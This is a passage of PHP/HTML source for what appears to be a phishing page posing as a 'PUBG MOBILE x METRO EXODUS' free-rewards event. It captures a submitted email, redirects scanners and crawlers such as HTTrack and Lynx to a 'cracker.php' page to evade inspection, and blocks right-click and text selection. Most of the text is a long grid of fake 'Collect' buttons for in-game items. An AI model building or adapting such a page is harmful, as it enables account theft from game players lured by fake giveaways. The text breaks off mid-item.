<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">

<div class="navbar">
<img src="https://1.bp.blogspot.com/-xjxNktyQlZY/XD55GMfob8I/AAAAAAAAdGU/2kOKN5RSb5wSaPxvc2ZkDX4xwBFm-V4sACLcBGAs/s1600/Metro_Logo_mono_b%2B%25281%2529.png">
</div>

<div class="header">
<div class="header-txt-bg"></div>
<div class="header-txt">Collect your free rewards in Metro Exodus event</div>
</div>

<div class="box">
<center>
<div class="alert-wrapper">
<div class="alert-content">
Welcome to PUBG MOBILE x METRO EXODUS event
<i class="fa fa-bell"></i>
</div>
</div>
<div class="menu active" onmousedown="buka.play()" onclick="openHero(event, 'latest');" id="defaultOpen">Latest Reward</div>
<div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'weapon');">Weapon Reward</div>
<div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'other');">Other Reward</div>
</center>

<div id="latest" class="gallery">
<div class="scroll">
<center>

<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9W3h47v/1.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/9W3h47v/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hMsPMxw/2.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/hMsPMxw/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/1TdQprZ/3.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/1TdQprZ/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/vscMKsk/4.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/vscMKsk/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/s5M6Hfk/5.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/s5M6Hfk/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/whLQPwP/6.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/whLQPwP/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KVtTgHb/7.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/KVtTgHb/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/f2j82yk/8.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/f2j82yk/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qdC5zHF/5.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/qdC5zHF/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mTpf1bz/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mTpf1bz/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pd4MrC6/4.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/pd4MrC6/4.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Xjjs6Mv/5.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Xjjs6Mv/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wwCwgFX/6.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/wwCwgFX/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/sVkDgf7/8.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/sVkDgf7/8.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/7v7cDFb/9.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/7v7cDFb/9.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0mK0Kkm/1.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/0mK0Kkm/1.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/x70Zv58/2.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/x70Zv58/2.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SfsVZj3/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/SfsVZj3/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VgpfgHx/4.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/VgpfgHx/4.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/m8swBsJ/5.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/m8swBsJ/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mqswmqy/6.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mqswmqy/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mzBCPj0/7.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mzBCPj0/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/RBm3cZg/8.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/RBm3cZg/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GkxtWsH/9.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/GkxtWsH/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/vDzhn4G/10.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/vDzhn4G/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hV80jRJ/11.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/hV80jRJ/11.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TM4x8kF/12.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/TM4x8kF/12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3s4VjWb/13.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/3s4VjWb/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hyMFJVy/14.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/hyMFJVy/14.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Fb4WYn9/15.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Fb4WYn9/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wgC8DFJ/16.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/wgC8DFJ/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/z7tRFnK/17.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/z7tRFnK/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mSR83ZX/18.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mSR83ZX/18.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/r01vx8L/19.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/r01vx8L/19.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BzkrJPx/20.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/BzkrJPx/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KKsqN8c/21.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/KKsqN8c/21.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Ms6xmw1/22.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Ms6xmw1/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nszjrmK/23.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/nszjrmK/23.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/C8XSXtp/24.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/C8XSXtp/24.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/XFvVdkm/25.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/XFvVdkm/25.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/42KvPQD/26.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/42KvPQD/26.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PztSxRq/27.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/PztSxRq/27.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c1dyKJX/28.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/c1dyKJX/28.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SQctySW/29.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/SQctySW/29.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HhxqcZy/30.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/HhxqcZy/30.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BG71Lq8/1.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/BG71Lq8/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cYLYRnF/2.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/cYLYRnF/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Kmzt1kv/3.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Kmzt1kv/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ySj37hj/4.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/ySj37hj/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/kh4gdrP/5.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/kh4gdrP/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ZBrkgM8/6.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/ZBrkgM8/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ngP07s9/7.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/ngP07s9/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HGTx2s3/8.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/HGTx2s3/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mzb2f6V/9.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mzb2f6V/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/QHRMWMg/10.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/QHRMWMg/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/G9M0Bvm/11.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/G9M0Bvm/11.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wMD34vP/12.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/wMD34vP/12.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cwWc8V7/13.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/cwWc8V7/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0QtCjnz/14.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/0QtCjnz/14.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/g9zWGn4/15.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/g9zWGn4/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/MnM6Qdp/16.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/MnM6Qdp/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Rg2thNY/17.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Rg2thNY/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VQtZ0sH/18.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/VQtZ0sH/18.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/j3K6DSC/19.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/j3K6DSC/19.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WVQrH9j/20.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/WVQrH9j/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SrWTVzr/21.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/SrWTVzr/21.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YPXLK1h/22.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/YPXLK1h/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GWGX9DZ/23.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/GWGX9DZ/23.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Q8F2nX9/24.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Q8F2nX9/24.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Z6KDLDN/25.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Z6KDLDN/25.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N102xm6/26.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/N102xm6/26.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cwJRtR3/27.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/cwJRtR3/27.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/5x1w88X/28.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/5x1w88X/28.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/R0rQvw4/29.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/R0rQvw4/29.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/27fMpPf/30.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/27fMpPf/30.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cTcRJCZ/31.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/cTcRJCZ/31.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WPFTmgN/32.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/WPFTmgN/32.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0h8n8jN/33.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/0h8n8jN/33.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3WdQMkQ/34.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/3WdQMkQ/34.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n6KkVTX/35.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/n6KkVTX/35.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pWR4WQ1/36.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/pWR4WQ1/36.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/6DmJkWp/37.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/6DmJkWp/37.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9sT1w13/38.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/9sT1w13/38.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PQtBL6z/39.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/PQtBL6z/39.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Gk99ZQY/40.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Gk99ZQY/40.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/P44sdBP/41.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/P44sdBP/41.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0MhX7pL/42.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/0MhX7pL/42.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c6PYCWg/43.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/c6PYCWg/43.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qsw53N6/44.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/qsw53N6/44.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/rQ7NY9z/45.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/rQ7NY9z/45.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/X3CBhhv/46.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/X3CBhhv/46.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KLQY3Vg/47.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/KLQY3Vg/47.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nMmZ2Rc/48.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/nMmZ2Rc/48.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/XS1D33m/49.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/XS1D33m/49.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PQNxt7B/50.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/PQNxt7B/50.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab --->

<div id="weapon" class="gallery">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/zHXhQmQ/8.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/zHXhQmQ/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hcnPCFM/9.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/hcnPCFM/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/S78nnmC/1.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/S78nnmC/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Lk3B2mw/2.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Lk3B2mw/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YpbSGGN/3.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/YpbSGGN/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/54C3TwS/1.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/54C3TwS/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/8rwnBbf/2.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/8rwnBbf/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/JyKsRV9/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/JyKsRV9/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9NW5RBs/1.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/9NW5RBs/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DrzYVS0/2.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/DrzYVS0/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3cM96Bn/3.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/3cM96Bn/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/30shkpG/4.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/30shkpG/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DYcd3r8/5.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/DYcd3r8/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/m5MfkNp/6.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/m5MfkNp/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0hG72h9/7.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/0hG72h9/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c232k1x/8.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/c232k1x/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/smrqkwd/9.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/smrqkwd/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/stysM7v/10.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/stysM7v/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WgYyGnw/11.png">
<div>
